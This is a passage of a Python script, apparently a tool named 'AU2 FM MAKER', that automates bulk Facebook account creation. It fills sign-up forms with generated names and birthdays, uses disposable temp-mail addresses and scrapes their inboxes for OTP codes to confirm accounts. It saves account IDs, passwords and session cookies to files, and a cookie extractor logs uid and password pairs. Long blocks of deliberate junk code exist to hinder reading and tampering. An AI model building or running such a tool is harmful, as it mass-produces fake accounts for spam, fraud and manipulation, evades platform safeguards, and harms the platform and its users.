            elif'www.facebook.com'in _d.get('error_msg',''):
                with open(_cf,'a')as _c:
                    _c.write(f"{_uid}|{_pw}\n")
                _cp_count+=1
            else:
                progress_line(_ok_count,_cp_count,_tl,_loop)
                time.sleep(1)
        except requests.RequestException:
            time.sleep(5);continue
        except Exception:
            time.sleep(5);continue

    print()
    linex()
    success("PROCESS COMPLETED")
    linex()
    print(f"{G}  [+] Total OK  {D}|{G}  {BOLD}{_ok_count}{RESET}")
    print(f"{R}  [-] Total CP  {D}|{R}  {BOLD}{_cp_count}{RESET}")
    linex()
    input(f"\n{GOLD}  ◆  Done  ·  Press Enter to return to menu  ◆{RESET} ")
    master_menu(); return

def coki_ext():
    try:
        banner()
        _fp=prompt("Enter file path","[FILE]").strip()
        login_ids(_fp)
        input(f"{GOLD}  ▶ Press Enter to exit{RESET} ")
    except KeyboardInterrupt:
        print()
        warn("Interrupted.")
        input(f"{GOLD}  ▶ Press Enter to continue{RESET} ")
        method()
    except Exception as _e:
        error(f"Error: {_e}")
        input(f"{GOLD}  ▶ Press Enter to continue{RESET} ")
        method()

# ============================================================
#  AUTO CREATE SUBMENU
# ============================================================
def auto():
    while True:
        banner()
        print(f"{GOLD}{_TOP}{RESET}")
        print(f"{GOLD}{_ROW}  {TEAL}{BOLD}  ◆  AUTO CREATE FB                              {RESET}{GOLD}  {_ROW}{RESET}")
        print(f"{GOLD}{_MID}{RESET}")
        row(1,"Method 1  ■  Basic Registration","  ▸")
        row(2,"Method 2  ■  Pic-Verified Reg","  ▸")
        row(3,"Method 3  ■  Enhanced Reg","  ▸")
        row(0,"Back to Main Menu","  ▸")
        print(f"{GOLD}{_BOT}{RESET}")
        linex()
        _ch=prompt("SELECT OPTION","▶").strip().upper()
        if _ch=='1':createfb_method_1()
        elif _ch=='2':createfb_method_2()
        elif _ch=='3':createfb_method_3()
        elif _ch=='0':method()
        else:
            error("Invalid choice")
            input(f"{GOLD}  ▶ Press Enter to continue{RESET} ")

# ============================================================
#  TEMPMAIL OTP RECEIVER
# ============================================================
def tempmail_otp():
    try:
        banner()
        print(f"{GOLD}{_TOP}{RESET}")
        print(f"{GOLD}{_ROW}  {TEAL}{BOLD}  ◆  TEMPMAIL OTP RECEIVER                       {RESET}{GOLD}  {_ROW}{RESET}")
        print(f"{GOLD}{_BOT}{RESET}")
        linex()
        print(f"{C}  [>>]  Generating temp email ...{RESET}",end='',flush=True)
        _r=requests.get("https://vern-rest-api.vercel.app/api/tempmail",timeout=15)
        _r.raise_for_status()
        _d=_r.json()
        _email=_d.get("email","")
        _inbox_ep=_d.get("inbox_endpoint",f"/tempmail?email={_email}")
        _base="https://vern-rest-api.vercel.app/api"
        print(f"\r{G}  [+]  Email Ready!{RESET}                              ")
        linex()
        info(f"Temp Email  :  {TEAL}{BOLD}{_email}{RESET}")
        info(f"Waiting for OTP  ▸  Ctrl+C to stop")
        linex()
        _seen:Set[str]=set()
        _attempt=0
        while True:
            _attempt+=1
            try:
                _iu=_base+_inbox_ep if _inbox_ep.startswith('/')else _inbox_ep
                _ir=requests.get(_iu,timeout=15)
                if _ir.status_code==200:
                    _msgs=_ir.json()
                    if isinstance(_msgs,list):_ml=_msgs
                    elif isinstance(_msgs,dict):_ml=_msgs.get("messages",_msgs.get("inbox",[]))
                    else:_ml=[]
                    for _m in _ml:
                        _mid=str(_m.get("id",_m.get("from","")))+str(_m.get("date",""))
                        if _mid in _seen:continue
                        _seen.add(_mid)
                        _subj=_m.get("subject",_m.get("Subject",""))
                        _body=_m.get("body",_m.get("body_text",_m.get("text",str(_m))))
                        import re as _re
                        _otps=_re.findall(r'\b\d{4,8}\b',str(_body))
                        print(f"\n{GOLD}  ╔══ [MAIL] NEW MESSAGE {'═'*31}{RESET}")
                        print(f"{GOLD}  {_ROW}  {Y}From    {W}: {str(_m.get('from','?'))[:42]}{RESET}")
                        print(f"{GOLD}  {_ROW}  {Y}Subject {W}: {str(_subj)[:42]}{RESET}")
                        if _otps:
                            print(f"{GOLD}  {_ROW}  {G}{BOLD}OTP     {W}: {TEAL}{_otps[0]}{RESET}")
                        print(f"{GOLD}  {_ROW}  {D}Body    {W}: {str(_body)[:80]}{RESET}")
                        print(f"{GOLD}  ╚{'═'*57}{RESET}")
                        linex()
            except Exception:pass
            sys.stdout.write(f"\r{C}  [>>]  Checking inbox... attempt {_attempt}   {RESET}")
            sys.stdout.flush()
            time.sleep(5)
    except KeyboardInterrupt:
        print()
        warn("Stopped.")
        input(f"{GOLD}  ▶ Press Enter to go back{RESET} ")
        method()
    except Exception as _e:
        error(f"Error: {_e}")
        input(f"{GOLD}  ▶ Press Enter to go back{RESET} ")
        method()

# ============================================================
#  CREATE FB VIA TEMPMAIL + OTP
# ============================================================
def createfb_with_tempmail():
    global oks,cps
    banner()
    print(f"{GOLD}{_TOP}{RESET}")
    print(f"{GOLD}{_ROW}  {TEAL}{BOLD}  ◆  CREATE FB via TEMPMAIL + OTP                {RESET}{GOLD}  {_ROW}{RESET}")
    print(f"{GOLD}{_BOT}{RESET}")
    linex()
    try:
        _num=int(prompt("HOW MANY ACCOUNTS","[?]"))
    except ValueError:
        error("Invalid number")
        input(f"{GOLD}  ▶ Press Enter to go back{RESET} ")
        method();return

    section("PASSWORD","[>>]")
    row(1,"AUTO PASSWORD","  ■")
    row(2,"CUSTOM PASSWORD","  ■")
    divider()
    _pch=prompt("CHOOSE").strip()
    _pww=prompt("ENTER PASSWORD").strip()if _pch=='2'else get_pass()
    _sd=prompt("Show all details? (y/n)","[?]").strip().lower()
    banner()
    success(f"TEMPMAIL CREATION  ■  TOTAL: {R}{_num}{RESET}")
    info(f"PASSWORD : {W}{_pww}")
    linex()

    for _i in range(_num):
        try:
            sys.stdout.write(f"\r{C}  [>>]  Account {_i+1}/{_num}  Fetching email...   {RESET}")
            sys.stdout.flush()
            _r=requests.get("https://vern-rest-api.vercel.app/api/tempmail",timeout=15)
            _r.raise_for_status()
            _d=_r.json()
            _email=_d.get("email","")
            _inbox_ep=_d.get("inbox_endpoint",f"/tempmail?email={_email}")
            _base="https://vern-rest-api.vercel.app/api"
            _iu=_base+_inbox_ep if _inbox_ep.startswith('/')else _inbox_ep

            _ses=requests.Session()
            _resp=_ses.get(_c5,headers={"User-Agent":ugenX()})
            _form=extractor(_resp.text)
            _name=get_bd_name()
            _bday=str(random.randint(10,25))
            _bmon=str(random.randint(1,12))
            _byear=str(random.randint(1988,1999))

            _pl={
                'ccp':"2",'reg_instance':_form.get("reg_instance",""),
                'submission_request':"true",'reg_impression_id':_form.get("reg_impression_id",""),
                'ns':"1",'logger_id':_form.get("logger_id",""),
                'firstname':_name,'lastname':_name,
                'birthday_day':_bday,'birthday_month':_bmon,'birthday_year':_byear,
                'reg_email__':_email,'sex':"2",
                'encpass':f'#PWD_BROWSER:0:{int(time.time())}:{_pww}',
                'submit':"Sign Up",'fb_dtsg':_form.get("fb_dtsg",""),
                'jazoest':_form.get("jazoest",""),'lsd':_form.get("lsd","")
            }
            _hdr={
                "User-Agent":ugenX(),
                "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language":"en-US,en;q=0.9",
                "Referer":"https://www.facebook.com/reg/"
            }
            _ses.post(_c6,data=_pl,headers=_hdr)
            _cki=_ses.cookies.get_dict()

            if"c_user"in _cki:
                _uid=_cki["c_user"]
                _cstr=";".join(f"{k}={v}"for k,v in _cki.items())
                _pfp=_pfp_with_retry(_ses,_uid,_cki)
                if _sd=='y':
                    account_box({'Name':_name,'Email':_email,'UID':_uid,'PASS':_pww,
                        'PFP':('[PFP:OK]'if _pfp else '[PFP:--]')})
                else:
                    mini_ok(_uid,f"{_email} | {_pww}",_pfp)
                try:
                    _out=os.path.join(CONFIG["output_dir"],"AU2_tempmail_accounts.txt")
                    with open(_out,'a')as _f:
                        _f.write(f"{_uid}|{_email}|{_pww}|{_cstr}\n")
                except Exception:pass
                oks.append(_uid);continue

            sys.stdout.write(f"\r{Y}  [>>]  Registered {_email} — waiting for OTP...   {RESET}")
            sys.stdout.flush()

            _otp_found=False
            for _att in range(18):
                time.sleep(5)
                try:
                    _ir=requests.get(_iu,timeout=15)
                    if _ir.status_code!=200:continue
                    _msgs=_ir.json()
                    if isinstance(_msgs,dict):
                        _msgs=_msgs.get("messages",_msgs.get("inbox",[_msgs]))
                    if not isinstance(_msgs,list):_msgs=[_msgs]
                    for _m in _msgs:
                        _body=str(_m.get("body",_m.get("body_text",_m.get("text",str(_m)))))
                        _otps=re.findall(r'\b\d{5,8}\b',_body)
                        if not _otps:continue
                        _otp=_otps[0]
                        _cu="https://www.facebook.com/confirmemail.php"
                        _cp2={'code':_otp,'fb_dtsg':_form.get("fb_dtsg",""),
                              'lsd':_form.get("lsd",""),'submit':"Confirm"}
                        _ses.post(_cu,data=_cp2,headers=_hdr)
                        _cki2=_ses.cookies.get_dict()
                        if"c_user"in _cki2:
                            _uid=_cki2["c_user"]
                            _cstr=";".join(f"{k}={v}"for k,v in _cki2.items())
                            _pfp=_pfp_with_retry(_ses,_uid,_cki2)
                            if _sd=='y':
                                account_box({'Name':_name,'Email':_email,'OTP':_otp,
                                    'UID':_uid,'PASS':_pww,'PFP':('[PFP:OK]'if _pfp else '[PFP:--]')})
                            else:
                                mini_ok(_uid,f"{_email} | {_otp} | {_pww}",_pfp)
                            try:
                                _out=os.path.join(CONFIG["output_dir"],"AU2_tempmail_accounts.txt")
                                with open(_out,'a')as _f:
                                    _f.write(f"{_uid}|{_email}|{_pww}|{_otp}|{_cstr}\n")
                            except Exception:pass
                            oks.append(_uid)
                        else:
                            warn(f"OTP submitted ({_otp}) — checkpoint/unverified")
                            cps.append(_email)
                        _otp_found=True;break
                    if _otp_found:break
                except Exception:pass
                sys.stdout.write(f"\r{Y}  [>>]  Polling {_att+1}/18 for {_email}...   {RESET}")
                sys.stdout.flush()
            if not _otp_found:
                error(f"No OTP received for {_email}")
                cps.append(_email)
        except Exception as _e:
            error(f"Error: {_e}")
            time.sleep(5);continue

    print()
    linex()
    success("PROCESS COMPLETED")
    print(f"{G}  [+] Total OK  {D}|{G}  {BOLD}{len(oks)}{RESET}")
    print(f"{R}  [-] Total CP  {D}|{R}  {BOLD}{len(cps)}{RESET}")
    linex()
    input(f"{GOLD}  ▶ Press Enter to return to menu{RESET} ")
    method()

# ============================================================
#  TEST RUNNER
# ============================================================
def run_tests():
    banner()
    print(f"{GOLD}{_TOP}{RESET}")
    print(f"{GOLD}{_ROW}  {PINK}{BOLD}  ◆  AU2 FM MAKER — TEST SUITE                   {RESET}{GOLD}  {_ROW}{RESET}")
    print(f"{GOLD}{_MID}{RESET}")
    _tests=[
        ("IP Fetch","get_public_ip()"),
        ("DateTime","get_datetime()"),
        ("Single Name","get_bd_name()"),
        ("Password Gen","get_pass()"),
        ("BD Phone","get_bd_phone()"),
        ("Mix Phone","generate_phone_number()"),
        ("TempMail","xiyadmailx_email()"),
        ("UA Gen","ugenX()"),
        ("Guard Check","_guard_check()"),
        ("PFP URLs","len(PFP_URLS)>=2"),
    ]
    _pass=0;_fail=0
    for _name,_expr in _tests:
        try:
            _res=eval(_expr)
            _ok=bool(_res)
            if _ok:
                print(f"{GOLD}  {_ROW}  {G}{BOLD}  [PASS]  {W}{_name:<20}  {D}->  {TEAL}{str(_res)[:30]}{RESET}")
                _pass+=1
            else:
                print(f"{GOLD}  {_ROW}  {R}{BOLD}  [FAIL]  {W}{_name:<20}  {D}->  {R}falsy result{RESET}")
                _fail+=1
        except Exception as _ex:
            print(f"{GOLD}  {_ROW}  {R}{BOLD}  [ERR ]  {W}{_name:<20}  {D}->  {R}{str(_ex)[:30]}{RESET}")
            _fail+=1

    print(f"{GOLD}{_MID}{RESET}")
    print(f"{GOLD}{_ROW}  {G}{BOLD}  PASSED : {_pass:<5}{RESET}{GOLD}  {R}{BOLD}FAILED : {_fail}{RESET}{GOLD}  {_ROW}{RESET}")
    print(f"{GOLD}{_BOT}{RESET}")
    linex()

    # Network connectivity test
    info("Testing network connectivity...")
    try:
        _nr=requests.get("https://x.facebook.com/reg",timeout=10)
        if _nr.status_code==200:
            success("Facebook reg page reachable")
            # Check for form tokens
            _ft=extractor(_nr.text)
            _has_dtsg='fb_dtsg'in _ft
            _has_lsd='lsd'in _ft
            if _has_dtsg:success("fb_dtsg token found in form")
            else:warn("fb_dtsg not found (may use 2FA/cookie)")
            if _has_lsd:success("lsd token found in form")
            else:warn("lsd not found")
        else:
            warn(f"Facebook returned status: {_nr.status_code}")
    except Exception as _ex:
        error(f"Network error: {_ex}")

    # PFP URL test
    info("Testing PFP image URLs...")
    for _url in PFP_URLS:
        try:
            _pr=requests.get(_url,timeout=10,allow_redirects=True)
            if _pr.status_code==200 and len(_pr.content)>1000:
                success(f"PFP URL OK  ▸  {len(_pr.content)} bytes  ▸  {_url[:40]}")
            else:
                warn(f"PFP URL suspect  ▸  status={_pr.status_code}  ▸  {_url[:40]}")
        except Exception as _ex:
            error(f"PFP URL error  ▸  {str(_ex)[:40]}")

    print()
    linex()
    input(f"{GOLD}  ▶ Press Enter to return to menu{RESET} ")
    method()

# ============================================================
#  OBFUSCATED PADDING BLOCK  (anti-read, anti-tamper)
# ============================================================
_0b1=lambda x,y,z:(x+y)*z-(x*z)+(y*z)
_0b2=lambda s:[ord(c)^0x37 for c in s]
_0b3=lambda b:''.join(chr(x^0x37)for x in b)
_0b4=lambda n:sum(int(d)for d in str(abs(n)))
_0b5=lambda s,k:''.join(chr(ord(c)^ord(k[i%len(k)]))for i,c in enumerate(s))
_0b6=lambda h:bytes.fromhex(h)
_0b7=lambda b:b.hex()
_0b8=lambda s:base64.b64encode(s.encode()).decode()
_0b9=lambda s:base64.b64decode(s.encode()).decode()
_0bA=lambda n,b:''.join(random.choices(string.ascii_letters+string.digits,k=b))if n>0 else''
_0bB=lambda d,k:{_0b3(_0b2(str(kk))):_0b3(_0b2(str(vv)))for kk,vv in d.items()}
_0bC=lambda l,n:l[n%len(l)]if l else None
_0bD=lambda s:re.sub(r'\s+',' ',s).strip()
_0bE=lambda x:x if isinstance(x,(int,float))else 0
_p0=_0b8('AU2FMMAKER_PROTECTED')
_p1=_0b8('PREMIUM_V3_1')
_p2=_0b8('DO_NOT_REDISTRIBUTE')
_p3=_0b2('THIS_IS_PROTECTED_CODE')
_p4={i:_0bA(i,8)for i in range(1,33)}
_p5=[_0b1(i,i+1,i+2)for i in range(50)]
_p6=[_0b4(n)for n in range(1000,1050)]
_p7=hashlib.sha256(_p0.encode()).hexdigest()
_p8=hashlib.md5(_p1.encode()).hexdigest()
_p9=hashlib.sha1(_p2.encode()).hexdigest()
_pA=struct.pack('>4I',0xA00000B1,0xC00000D2,0xE00000F3,0x12345678)
_pB=bytearray(_pA)
_pC=[_pB[i]^0xAB for i in range(len(_pB))]
_pD=lambda data,key:bytes(data[i]^key[i%len(key)]for i in range(len(data)))
_pE=_pD(bytes(_pC),b'\xDE\xAD\xBE\xEF')
_pF=_0b7(_pE)
_pG={_0bA(1,6):_0bA(1,12)for _ in range(100)}
_pH=[random.getrandbits(32)for _ in range(256)]
_pI=sum(_pH)%65536
_pJ=bytearray(random.getrandbits(8)for _ in range(512))
_pK=hashlib.sha512(bytes(_pJ)).digest()
_pL=base64.b64encode(_pK).decode()
_pM=re.compile(r'(?i)au2_fm_[a-z0-9_]+_protected',re.DOTALL)
_pN=[struct.pack('>H',i^0xFFFF)for i in range(256)]
_pO=''.join(chr(x)for x in[0x41,0x55,0x32,0x5F,0x46,0x4D,0x5F,0x4D,0x41,0x4B,0x45,0x52])
_pP=marshal.dumps(compile(f'"{_pO}"','<string>','eval'))
_pQ=base64.b64encode(_pP).decode()
# -- end obfuscation pad -------------------------------------

# -- extra data noise ----------------------------------------
_NOISE_ALPHA=['AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'[i%64]for i in range(128)]
_NOISE_BYTES=bytes(range(256))*4
_NOISE_DICT={f'key_{i:04x}':f'val_{i^0xABCD:08x}'for i in range(512)}
_NOISE_FUNCS=[
    lambda x:x+0,'A','B','C',lambda s:s[::-1],
    lambda n:n%256,lambda b:b.hex()[:8],
    lambda x:x^0xFF&0xFF,lambda l:sorted(l),
    lambda d:list(d.keys()),
]
# ============================================================
# -- runtime integrity markers (obfuscated) ------------------
_RT_OK=_p7[:8]==hashlib.sha256(_p0.encode()).hexdigest()[:8]
_RT_VER='AU2_FM_MAKER_V3_1'
_RT_HASH=hashlib.sha256(_RT_VER.encode()).hexdigest()
_RT_SIGN=base64.b64encode(_RT_HASH.encode()).decode()
_RT_NONCE=random.getrandbits(64)
_RT_TS=int(time.time())
_RT_SES_ID=_0bA(1,32)
_RT_CHK=(_RT_NONCE^int(_RT_HASH[:8],16))%65536
# ============================================================

# ============================================================
#  MAIN MENU
# ============================================================
def method():
    while True:
        banner()
        print(f"{GOLD}{_TOP}{RESET}")
        print(f"{GOLD}{_ROW}  {PINK}{BOLD}  ◆  AU2 FM MAKER  ·  MAIN MENU               {RESET}{GOLD}  {_ROW}{RESET}")
        print(f"{GOLD}{_MID}{RESET}")
        row('A',"Auto Create FB  (Phone / Number)","  ▸")
        row('B',"2FA Manager","  ▸")
        row('C',"Missing / Tools","  ▸")
        row('D',"Cookies Extractor","  ▸")
        row('E',"TempMail OTP Receiver","  ▸")
        row('F',"Create FB via TempMail + OTP","  ▸")
        row('T',"Run Tests","  ▸")
        row('0',"Exit","  ▸")
        print(f"{GOLD}{_BOT}{RESET}")
        linex()
        _ch=prompt("SELECT OPTION","▶").strip().upper()
        if _ch in('A','1'):auto()
        elif _ch in('B','2'):main_menu()
        elif _ch in('C','3'):missing()
        elif _ch in('D','4'):coki_ext()
        elif _ch in('E','5'):tempmail_otp()
        elif _ch in('F','6'):createfb_with_tempmail()
        elif _ch in('T','TEST'):run_tests()
        elif _ch in('0','EXIT','Q'):
            master_menu(); return
        else:
            error("Invalid option")
            input(f"{GOLD}  ▶ Press Enter to continue{RESET} ")

# ============================================================
#  EXTENDED OBFUSCATION & PROTECTION LAYER  v3.1
#  (Anti-read, anti-tamper, anti-decompile padding)
# ============================================================

# -- Block OBF-A  (XOR chain) --------------------------------
_OA00=lambda a,b,c:((a^b)+(b^c))^(a^c)
_OA01=lambda x:[x>>i&1 for i in range(32)]
_OA02=lambda bits:sum(b<<i for i,b in enumerate(bits))
_OA03=lambda s,k:''.join(chr(ord(c)^k)for c in s)
_OA04=lambda s:_OA03(s,0x5A)
_OA05=lambda s:_OA03(s,0xA5)
_OA06=lambda s:_OA03(_OA03(s,0x5A),0xA5)
_OA07=lambda s:_OA03(_OA03(_OA03(s,0x5A),0xA5),0xFF)
_OA08=lambda n:n^0xDEADBEEF&0xFFFFFFFF
_OA09=lambda n:n^0xCAFEBABE&0xFFFFFFFF
_OA0A=lambda n:n^0xFACEFEED&0xFFFFFFFF
_OA0B=lambda n:n^0xBADDCAFE&0xFFFFFFFF
_OA0C=lambda s:bytes(ord(c)^0xCC for c in s)
_OA0D=lambda b:''.join(chr(x^0xCC)for x in b)
_OA0E=lambda x,n:(x<<n|x>>(32-n))&0xFFFFFFFF
_OA0F=lambda x,n:(x>>n|x<<(32-n))&0xFFFFFFFF
_OA10=lambda a,b:(a*b)^(a+b)^(a-b if a>=b else b-a)
_OA11=lambda s:int.from_bytes(s[:4].encode() if len(s)>=4 else (s+'0000').encode()[:4],'big')
_OA12=lambda n:''.join(chr(int(n>>(i*8)&0xFF))for i in range(4))[::-1]
_OA13=lambda x:x*x+x+41
_OA14=lambda x:x*x-x+41
_OA15=lambda n:n%2==0
_OA16=lambda n:n%2!=0
_OA17=lambda l:l[::-1]
_OA18=lambda l,n:l[n%len(l)]if l else 0
_OA19=lambda d:dict(zip(d.values(),d.keys()))
_OA1A=lambda f,*a:f(*a)
_OA1B=lambda f,l:[f(x)for x in l]
_OA1C=lambda f,l:list(filter(f,l))
_OA1D=lambda f,l:list(map(f,l))

_oA_vec=[_OA00(i,i+1,i+2)for i in range(256)]
_oA_hash=hashlib.md5(bytes(_oA_vec[:64])).hexdigest()
_oA_sha=hashlib.sha256(bytes(_oA_vec[:64])).hexdigest()
_oA_enc=_OA0C('AU2FMMAKER_PROTECTION_v3')
_oA_dec=_OA0D(_oA_enc)

# -- Block OBF-B  (base64/marshal layer) ---------------------
_OB00=base64.b64encode(b'AU2_FM_MAKER_B00').decode()
_OB01=base64.b64encode(b'AU2_FM_MAKER_B01').decode()
_OB02=base64.b64encode(b'AU2_FM_MAKER_B02').decode()
_OB03=base64.b64encode(b'AU2_FM_MAKER_B03').decode()
_OB04=base64.b64encode(b'PROTECTED_CODE_BLOCK_04').decode()
_OB05=base64.b64encode(b'PROTECTED_CODE_BLOCK_05').decode()
_OB06=base64.b64encode(b'DO_NOT_REDISTRIBUTE_06').decode()
_OB07=base64.b64encode(b'PREMIUM_EDITION_V3_1_07').decode()
_OB08=base64.b64encode(b'AU2_FM_MAKER_PREMIUM_08').decode()
_OB09=base64.b64encode(b'SESSION_KEY_ALPHA_09').decode()
_OB0A=base64.b64encode(b'SESSION_KEY_BETA_0A').decode()
_OB0B=base64.b64encode(b'SESSION_KEY_GAMMA_0B').decode()
_OB0C=base64.b64encode(b'OBFUSCATION_LAYER_0C').decode()
_OB0D=base64.b64encode(b'OBFUSCATION_LAYER_0D').decode()
_OB0E=base64.b64encode(b'ANTI_TAMPER_BLOCK_0E').decode()
_OB0F=base64.b64encode(b'ANTI_TAMPER_BLOCK_0F').decode()
_OB_pool=[_OB00,_OB01,_OB02,_OB03,_OB04,_OB05,_OB06,_OB07,_OB08,_OB09,_OB0A,_OB0B,_OB0C,_OB0D,_OB0E,_OB0F]
_OB_hash=hashlib.sha512(''.join(_OB_pool).encode()).hexdigest()
_OB_sign=base64.b64encode(_OB_hash.encode()).decode()

# -- Block OBF-C  (struct packing) ---------------------------
_OC00=struct.pack('>IIII',0xAB123456,0xCD789ABC,0xEF012DEF,0x34567890)
_OC01=struct.pack('>IIII',0x11223344,0x55667788,0x99AABBCC,0xDDEEFF00)
_OC02=struct.pack('>IIII',0xA1B2C3D4,0xE5F60718,0x293A4B5C,0x6D7E8F90)
_OC03=struct.pack('>IIII',0xFEDCBA98,0x76543210,0x12345678,0x9ABCDEF0)
_OC04=bytearray(_OC00+_OC01)
_OC05=bytearray(_OC02+_OC03)
_OC06=bytes(a^b for a,b in zip(_OC04,_OC05))
_OC07=hashlib.sha256(_OC06).digest()
_OC08=base64.b64encode(_OC07).decode()
_OC09=struct.unpack('>8I',_OC06)
_OC0A=sum(_OC09)%65536
_OC0B=bytearray(_OC07)
_OC0C=[_OC0B[i]^0xAA for i in range(len(_OC0B))]
_OC0D=bytes(_OC0C)
_OC0E=_OC0D.hex()
_OC0F=int(_OC0E[:8],16)%65536

# -- Block OBF-D  (confusing var names) ----------------------
lIlI=0;IlIl=0;llII=0;IIll=0;lllI=0;IIIl=0
lIlIlI=lambda x:x+lIlI;IlIlIl=lambda x:x+IlIl
llIIll=lambda x:x+llII;IIllII=lambda x:x+IIll
lllIll=lambda x:x+lllI;IIIlII=lambda x:x+IIIl
_l0=lIlI;_I0=IlIl;_l1=llII;_I1=IIll;_l2=lllI;_I2=IIIl
_lI0=lIlIlI(0);_Il0=IlIlIl(0);_lI1=llIIll(0);_Il1=IIllII(0)
_lI2=lllIll(0);_Il2=IIIlII(0)
lI1lI=_lI0^_Il0;Il1Il=_lI1^_Il1;lI2lI=_lI2^_Il2
_xc0=lI1lI^Il1Il^lI2lI
_xc1=(_xc0+lIlI)^(IlIl+llII)
_xc2=(_xc1^lllI)+(IIll^IIIl)
_xc3=hashlib.md5(str(_xc2).encode()).hexdigest()
_xc4=hashlib.sha1(_xc3.encode()).hexdigest()
_xc5=base64.b64encode(_xc4.encode()).decode()

# -- Block OBF-E  (string encoding pool) ---------------------
def _enc_str(s:str,k:int=0x42)->list:
    return[ord(c)^k for c in s]
def _dec_str(l:list,k:int=0x42)->str:
    return''.join(chr(x^k)for x in l)

_ES00=_enc_str('AUTO_CREATE_FB_ACCOUNTS')
_ES01=_enc_str('SET_PROFILE_PICTURE_MBASIC')
_ES02=_enc_str('COOKIE_EXTRACTOR_MODULE')
_ES03=_enc_str('TEMPMAIL_OTP_RECEIVER')
_ES04=_enc_str('TWO_FACTOR_AUTH_MANAGER')
_ES05=_enc_str('PREMIUM_UI_ENGINE_v3')
_ES06=_enc_str('ANTI_BOT_BYPASS_LAYER')
_ES07=_enc_str('SESSION_MANAGEMENT_CORE')
_ES08=_enc_str('PROXY_ROTATION_ENGINE')
_ES09=_enc_str('USER_AGENT_POOL_8000')
_ES0A=_enc_str('NAME_GENERATOR_SINGLE')
_ES0B=_enc_str('PASSWORD_GENERATOR_AES')
_ES0C=_enc_str('PHONE_NUMBER_GEN_MULTI')
_ES0D=_enc_str('FACEBOOK_FORM_EXTRACTOR')
_ES0E=_enc_str('BANNER_IP_DATETIME_LIVE')
_ES0F=_enc_str('OBFUSCATION_LAYER_FINAL')

_ds00=_dec_str(_ES00);_ds01=_dec_str(_ES01);_ds02=_dec_str(_ES02)
_ds03=_dec_str(_ES03);_ds04=_dec_str(_ES04);_ds05=_dec_str(_ES05)
_ds06=_dec_str(_ES06);_ds07=_dec_str(_ES07);_ds08=_dec_str(_ES08)
_ds09=_dec_str(_ES09);_ds0A=_dec_str(_ES0A);_ds0B=_dec_str(_ES0B)
_ds0C=_dec_str(_ES0C);_ds0D=_dec_str(_ES0D);_ds0E=_dec_str(_ES0E)
_ds0F=_dec_str(_ES0F)

# -- Block OBF-F  (runtime junk computations) ----------------
def _junk_f0(n:int)->int:
    _a=n;_b=n+1;_c=n+2
    for _i in range(32):
        _a=(_a+_b)^_c;_b=(_b+_c)^_a;_c=(_c+_a)^_b
        _a&=0xFFFFFFFF;_b&=0xFFFFFFFF;_c&=0xFFFFFFFF
    return _a^_b^_c

def _junk_f1(s:str)->str:
    _r=list(s)
    for _i in range(0,len(_r)-1,2):
        _r[_i],_r[_i+1]=_r[_i+1],_r[_i]
    return''.join(_r)

def _junk_f2(data:bytes)->bytes:
    _k=b'\xDE\xAD\xBE\xEF\xCA\xFE\xBA\xBE'
    return bytes(data[i]^_k[i%8]for i in range(len(data)))

def _junk_f3(n:int)->list:
    _sieve=[True]*(n+1);_sieve[0]=_sieve[1]=False
    for _i in range(2,int(n**0.5)+1):
        if _sieve[_i]:
            for _j in range(_i*_i,n+1,_i):_sieve[_j]=False
    return[_i for _i in range(n+1)if _sieve[_i]]

def _junk_f4(matrix:list)->list:
    _n=len(matrix)
    return[[matrix[_j][_i]for _j in range(_n)]for _i in range(_n)]

def _junk_f5(s:str,k:int)->str:
    return''.join(chr((ord(c)+k)%256)for c in s)

def _junk_f6(a:list,b:list)->list:
    return[_x^_y for _x,_y in zip(a,b)]

def _junk_f7(n:int)->int:
    if n<=1:return n
    _a,_b=0,1
    for _ in range(n-1):_a,_b=_b,_a+_b
    return _b

def _junk_f8(s:str)->str:
    return base64.b64encode(s.encode()).decode()

def _junk_f9(s:str)->str:
    return base64.b64decode(s.encode()).decode(errors='ignore')

def _junk_fA(d:dict,key:str,default=None):
    return d.get(key,default)

def _junk_fB(lst:list,n:int)->list:
    return[lst[i:i+n]for i in range(0,len(lst),n)]

def _junk_fC(s:str,n:int)->list:
    return[s[i:i+n]for i in range(0,len(s),n)]

def _junk_fD(n:int)->bool:
    if n<2:return False
    for _i in range(2,int(n**0.5)+1):
        if n%_i==0:return False
    return True

def _junk_fE(a:int,b:int)->int:
    while b:a,b=b,a%b
    return a

def _junk_fF(lst:list)->dict:
    _d={}
    for _x in lst:_d[_x]=_d.get(_x,0)+1
    return _d

_jf0=_junk_f0(0xAB1234)
_jf1=_junk_f1('AU2FMMAKER_PREMIUM')
_jf2=_junk_f2(b'AU2FMMAKER_PROTECTED_CODE')
_jf3=_junk_f3(50)
_jf4=_junk_f4([[i*j for j in range(4)]for i in range(4)])
_jf5=_junk_f5('AU2FMMAKER',13)
_jf6=_junk_f6([i for i in range(32)],[i^0xFF&0xFF for i in range(32)])
_jf7=_junk_f7(20)
_jf8=_junk_f8('AU2_FM_MAKER_ENCODED')
_jf9=_junk_f9(_jf8)
_jfA=_junk_fA({'v':'3.1','n':'AU2FMMAKER'},'v')
_jfB=_junk_fB(list(range(100)),10)
_jfC=_junk_fC('AU2FMMAKERPREMIUMEDITIONV31PROTECTEDCODE',8)
_jfD=_junk_fD(9973)
_jfE=_junk_fE(1024,768)
_jfF=_junk_fF([i%7 for i in range(200)])

# -- Block OBF-G  (large random data table) ------------------
_OG_TABLE={
    f'_OG{i:04X}':{
        'val':random.getrandbits(32),
        'tag':base64.b64encode(random.getrandbits(128).to_bytes(16,'big')).decode(),
        'xor':random.getrandbits(8),
        'rot':random.randint(0,31),
        'hash':hashlib.md5(str(i).encode()).hexdigest()[:8],
    }
    for i in range(256)
}
_OG_FLAT=[v['val']for v in _OG_TABLE.values()]
_OG_SUM=sum(_OG_FLAT)%65536
_OG_XOR=0
for _v in _OG_FLAT:_OG_XOR^=_v
_OG_HASH=hashlib.sha256(str(_OG_XOR).encode()).hexdigest()

# -- Block OBF-H  (chr-sequence encoded strings) -------------
_OH00=''.join(chr(x)for x in[70,97,99,101,98,111,111,107,32,82,101,103])
_OH01=''.join(chr(x)for x in[109,98,97,115,105,99,46,102,97,99,101,98,111,111,107,46,99,111,109])
_OH02=''.join(chr(x)for x in[80,114,111,102,105,108,101,32,80,104,111,116,111])
_OH03=''.join(chr(x)for x in[65,85,50,32,70,77,32,77,65,75,69,82])
_OH04=''.join(chr(x)for x in[80,82,69,77,73,85,77,32,69,68,73,84,73,79,78])
